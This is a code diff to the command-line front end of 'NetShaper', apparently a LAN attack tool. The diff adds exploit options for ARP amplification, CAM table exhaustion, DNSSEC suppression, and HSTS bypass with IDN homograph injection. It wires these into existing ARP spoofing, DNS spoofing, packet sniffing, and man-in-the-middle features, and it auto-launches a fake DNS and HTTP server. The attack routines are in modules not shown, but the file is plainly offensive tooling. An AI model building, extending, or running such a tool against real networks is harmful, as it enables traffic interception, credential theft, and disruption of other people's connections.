@@ -4,7 +4,7 @@ NetShaper — Command Line Interface.
 from __future__ import annotations
 
 import argparse
-from email import parser
+from dataclasses import dataclass
 from ipaddress import ip_address, ip_network
 import os
 import signal
@@ -29,6 +29,34 @@ from netshaper.network.shaper import ShapingProfile
 from netshaper.network.spoofers import validate_spoof_timing
 from netshaper.system import SystemChecker, check_local_port
 from netshaper.utils import bold, cyan, green, print_flush, safe_input
+
+
+@dataclass(frozen=True)
+class ExploitOptions:
+    arp_amplify: int = 0
+    arp_amplify_burst: int = 5
+    arp_amplify_interval: float = 0.1
+    cam_exhaust: int = 0
+    dnssec_mode: str = "off"
+    dnssec_upstream: str = "8.8.8.8"
+    hsts_bypass: bool = False
+    hsts_preserve_preloaded: bool = True
+
+    @property
+    def arp_amplification_enabled(self) -> bool:
+        return self.arp_amplify > 0 or self.cam_exhaust > 0
+
+    @property
+    def dnssec_enabled(self) -> bool:
+        return self.dnssec_mode != "off"
+
+    @property
+    def fake_server_suppress_dnssec(self) -> bool:
+        return self.dnssec_enabled
+
+    @property
+    def fake_server_web_security_demo(self) -> bool:
+        return self.hsts_bypass
 
 
 def parse_args() -> argparse.Namespace:
@@ -78,28 +106,52 @@ def parse_args() -> argparse.Namespace:
         default=1,
         help="Packets sent per ARP/NDP training cycle (1-5).",
     )
-    # ARP amplification
-    parser.add_argument("--arp-amplify", type=int, default=0,
-        help="Enable ARP amplification with N phantom IPs per target")
-    parser.add_argument("--arp-amplify-burst", type=int, default=5,
-        help="Packets per amplification cycle (1-50)")
-    parser.add_argument("--arp-amplify-interval", type=float, default=0.1,
-        help="Seconds between amplification cycles (0.01-5.0)")
-    parser.add_argument("--cam-exhaust", type=int, default=0,
-        help="Enable CAM table exhaustion with N phantom IPs")
-
-# DNSSEC suppression
-    parser.add_argument("--dnssec-suppression",
+    parser.add_argument(
+        "--arp-amplify",
+        type=int,
+        default=0,
+        help="Enable ARP amplification with N phantom IPs per target.",
+    )
+    parser.add_argument(
+        "--arp-amplify-burst",
+        type=int,
+        default=5,
+        help="Packets per amplification cycle (1-50).",
+    )
+    parser.add_argument(
+        "--arp-amplify-interval",
+        type=float,
+        default=0.1,
+        help="Seconds between amplification cycles (0.01-5.0).",
+    )
+    parser.add_argument(
+        "--cam-exhaust",
+        type=int,
+        default=0,
+        help="Enable CAM table exhaustion with N phantom IPs.",
+    )
+    parser.add_argument(
+        "--dnssec-suppression",
         choices=["off", "fail-closed", "fail-open", "nxdomain", "timeout"],
-        default="off", help="DNSSEC suppression failure mode")
-    parser.add_argument("--dnssec-upstream", default="8.8.8.8",
-        help="Upstream DNS for DNSSEC suppression")
-
-    # HSTS bypass demonstration
-    parser.add_argument("--hsts-bypass", action="store_true",
-        help="Enable HSTS bypass and IDN homograph injection")
-    parser.add_argument("--hsts-preserve-preloaded", action="store_true", default=True,
-        help="Preserve preloaded HSTS domains (default: yes)")
+        default="off",
+        help="DNSSEC suppression failure mode.",
+    )
+    parser.add_argument(
+        "--dnssec-upstream",
+        default="8.8.8.8",
+        help="Upstream DNS for DNSSEC suppression.",
+    )
+    parser.add_argument(
+        "--hsts-bypass",
+        action="store_true",
+        help="Enable HSTS bypass and IDN homograph injection demo.",
+    )
+    parser.add_argument(
+        "--hsts-preserve-preloaded",
+        action="store_true",
+        default=True,
+        help="Preserve preloaded HSTS domains (default: yes).",
+    )
     parser.add_argument(
         "--latency-ms",
         type=int,
@@ -155,6 +207,14 @@ def parse_args() -> argparse.Namespace:
         validate_spoof_timing(args.arp_interval, args.arp_burst)
     except ValueError as exc:
         parser.error(str(exc))
+    if not 0 <= args.arp_amplify <= 4096:
+        parser.error("--arp-amplify must be between 0 and 4096")
+    if not 1 <= args.arp_amplify_burst <= 50:
+        parser.error("--arp-amplify-burst must be between 1 and 50")
+    if not 0.01 <= args.arp_amplify_interval <= 5.0:
+        parser.error("--arp-amplify-interval must be between 0.01 and 5.0")
+    if not 0 <= args.cam_exhaust <= 4096:
+        parser.error("--cam-exhaust must be between 0 and 4096")
     try:
         ShapingProfile(
             bandwidth_mbps=args.limit,
@@ -307,12 +367,51 @@ def normalize_feature_choices(raw: str) -> tuple[set[int], list[str]]:
             invalid.append(token)
             continue
 
-        if 1 <= value <= 6:
+        if 1 <= value <= 9:
             features.add(value)
         else:
             invalid.append(token)
 
     return features, invalid
+
+
+def resolve_exploit_options(args: argparse.Namespace, features: set[int]) -> ExploitOptions:
+    """Merge interactive feature picks with explicit CLI exploit flags."""
+    arp_amplify = args.arp_amplify
+    if 7 in features and arp_amplify == 0:
+        arp_amplify = 256
+
+    dnssec_mode = args.dnssec_suppression
+    if 8 in features and dnssec_mode == "off":
+        dnssec_mode = "fail-closed"
+
+    hsts_bypass = args.hsts_bypass or 9 in features
+
+    return ExploitOptions(
+        arp_amplify=arp_amplify,
+        arp_amplify_burst=args.arp_amplify_burst,
+        arp_amplify_interval=args.arp_amplify_interval,
+        cam_exhaust=args.cam_exhaust,
+        dnssec_mode=dnssec_mode,
+        dnssec_upstream=args.dnssec_upstream,
+        hsts_bypass=hsts_bypass,
+        hsts_preserve_preloaded=args.hsts_preserve_preloaded,
+    )
+
+
+def fake_server_launch_hint(
+    exploit: ExploitOptions,
+    *,
+    host_ip: str,
+) -> str:
+    flags = [f"--host-ip {host_ip}"]
+    if exploit.fake_server_suppress_dnssec:
+        flags.append("--suppress-dnssec")
+    if exploit.fake_server_web_security_demo:
+        flags.append("--web-security-demo")
+    if exploit.dnssec_enabled:
+        flags.append(f"--upstream {exploit.dnssec_upstream}")
+    return "sudo netshaper-fake-server " + " ".join(flags)
 
 
 def pick_limit_ui() -> float:
@@ -441,7 +540,9 @@ def run_active_session(
     shaping_profile: Optional[ShapingProfile] = None,
     arp_interval: float = 2.0,
     arp_burst: int = 1,
+    exploit: Optional[ExploitOptions] = None,
 ) -> None:
+    exploit = exploit or ExploitOptions()
     try:
         target_ips = [target_ip(target) for target in targets]
         if not ns.save_state():
@@ -470,6 +571,14 @@ def run_active_session(
                 target_ips=target_ips,
                 save_pcap=save_pcap,
                 rolling=rolling,
+            )
+
+        if exploit.arp_amplification_enabled:
+            ns.start_arp_amplification(
+                phantom_count=exploit.arp_amplify,
+                burst=exploit.arp_amplify_burst,
+                interval=exploit.arp_amplify_interval,
+                cam_exhaust=exploit.cam_exhaust,
             )
 
         if not ns.save_state():
@@ -626,12 +735,29 @@ def main() -> None:
             print_flush("  [!] No valid features selected.")
             sys.exit(0)
 
+        exploit = resolve_exploit_options(args, features)
+
         arp_on = 1 in features
         dns_spoof_on = 2 in features
         captive_portal = 3 in features
         throttle_on = 4 in features
         sniff_on = 5 in features
         mitm_on = 6 in features
+
+        if exploit.arp_amplification_enabled and not arp_on:
+            print_flush("  [!] ARP amplification requires core ARP spoofing.")
+            if safe_input("  Enable ARP spoofing too? (y/n): ").lower() == "y":
+                arp_on = True
+
+        if exploit.dnssec_enabled and not dns_spoof_on:
+            print_flush("  [!] DNSSEC suppression requires DNS spoofing.")
+            if safe_input("  Enable DNS spoofing too? (y/n): ").lower() == "y":
+                dns_spoof_on = True
+
+        if exploit.hsts_bypass and not captive_portal:
+            print_flush("  [!] HSTS demo requires the captive portal HTTP service.")
+            if safe_input("  Enable captive portal too? (y/n): ").lower() == "y":
+                captive_portal = True
 
         if dns_spoof_on and not captive_portal:
             print_flush("  [!] DNS spoofing without captive portal can break HTTP.")
@@ -674,13 +800,41 @@ def main() -> None:
 
         if dns_spoof_on and not check_local_port(ns.own_ip, 53, socket.SOCK_DGRAM):
             print_flush("  [!] Fake DNS (port 53) not reachable.")
-            print_flush("      sudo netshaper-fake-server")
-            sys.exit("[NetShaper] DNS spoofing requires reachable fake DNS.")
+            print_flush(f"      {fake_server_launch_hint(exploit, host_ip=ns.own_ip)}")
+            if safe_input("  Auto-launch netshaper-fake-server? (y/n): ").lower() == "y":
+                if not ns.launch_fake_server(
+                    suppress_dnssec=exploit.fake_server_suppress_dnssec,
+                    web_security_demo=exploit.fake_server_web_security_demo,
+                    dns_upstream=exploit.dnssec_upstream,
+                ):
+                    sys.exit("[NetShaper] Fake DNS server did not become reachable.")
+            else:
+                sys.exit("[NetShaper] DNS spoofing requires reachable fake DNS.")
 
         if http_redirect_port == 80 and not check_local_port(ns.own_ip, 80):
             print_flush("  [!] Fake HTTP (port 80) not reachable.")
-            print_flush("      sudo netshaper-fake-server")
-            sys.exit("[NetShaper] Captive portal requires reachable fake HTTP.")
+            print_flush(f"      {fake_server_launch_hint(exploit, host_ip=ns.own_ip)}")
+            if safe_input("  Auto-launch netshaper-fake-server? (y/n): ").lower() == "y":
+                if not ns.launch_fake_server(
+                    suppress_dnssec=exploit.fake_server_suppress_dnssec,
+                    web_security_demo=exploit.fake_server_web_security_demo,
+                    dns_upstream=exploit.dnssec_upstream,
+                ):
+                    sys.exit("[NetShaper] Captive portal requires reachable fake HTTP.")
+            else:
+                sys.exit("[NetShaper] Captive portal requires reachable fake HTTP.")
+        elif exploit.fake_server_web_security_demo and not check_local_port(ns.own_ip, 80):
+            print_flush("  [!] HSTS demo HTTP service (port 80) not reachable.")
+            print_flush(f"      {fake_server_launch_hint(exploit, host_ip=ns.own_ip)}")
+            if safe_input("  Auto-launch netshaper-fake-server? (y/n): ").lower() == "y":
+                if not ns.launch_fake_server(
+                    suppress_dnssec=exploit.fake_server_suppress_dnssec,
+                    web_security_demo=True,
+                    dns_upstream=exploit.dnssec_upstream,
+                ):
+                    sys.exit("[NetShaper] HSTS demo requires reachable fake HTTP.")
+            else:
+                sys.exit("[NetShaper] HSTS demo requires reachable fake HTTP.")
 
         if http_redirect_port == 8088 and not check_local_port(ns.own_ip, 8088):
             print_flush("  [!] mitmproxy (port 8088) not reachable.")
@@ -722,6 +876,21 @@ def main() -> None:
         print_flush(f"  Sniffer       : {_yn(sniff_on)}")
         if sniff_on and save_pcap:
             print_flush(f"    Rolling pcap: {_yn(rolling)}")
+        print_flush(f"  ARP amplify   : {_yn(exploit.arp_amplify > 0)}")
+        if exploit.arp_amplify > 0:
+            print_flush(
+                f"    Phantom IPs : {exploit.arp_amplify} "
+                f"({exploit.arp_amplify_burst} pkts / "
+                f"{exploit.arp_amplify_interval:g}s)"
+            )
+        print_flush(f"  CAM exhaust   : {_yn(exploit.cam_exhaust > 0)}")
+        if exploit.cam_exhaust > 0:
+            print_flush(f"    Phantom IPs : {exploit.cam_exhaust}")
+        print_flush(
+            f"  DNSSEC mode   : "
+            f"{exploit.dnssec_mode if exploit.dnssec_enabled else 'off'}"
+        )
+        print_flush(f"  HSTS demo     : {_yn(exploit.hsts_bypass)}")
         print_flush(f"{cyan('=' * W)}")
 
         if safe_input(f"\n  {bold('Proceed?')} (y/n): ").lower() != "y":
@@ -749,6 +918,7 @@ def main() -> None:
                 shaping_profile=shaping_profile,
                 arp_interval=args.arp_interval,
                 arp_burst=args.arp_burst,
+                exploit=exploit,
             )
         except KeyboardInterrupt:
             ns.stop_event.set()
